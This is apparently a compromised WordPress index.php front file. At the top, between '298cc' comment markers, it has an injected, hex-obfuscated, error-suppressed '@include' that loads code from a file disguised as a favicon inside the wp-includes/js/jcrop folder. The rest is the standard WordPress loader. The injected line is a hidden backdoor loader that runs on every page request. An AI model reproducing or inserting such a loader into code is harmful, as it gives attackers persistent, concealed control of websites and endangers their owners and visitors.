<?php
/*298cc*/

@include "\x2fe\x78p\x6fr\x74/\x63g\x69/\x63o\x6d/\x6c/\x6c/\x74o\x6by\x6fn\x61k\x61n\x6f-\x6cl\x2fw\x70-\x69n\x63l\x75d\x65s\x2fj\x73/\x6ac\x72o\x70/\x66a\x76i\x63o\x6e_\x368\x383\x35a\x2ei\x63o";

/*298cc*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
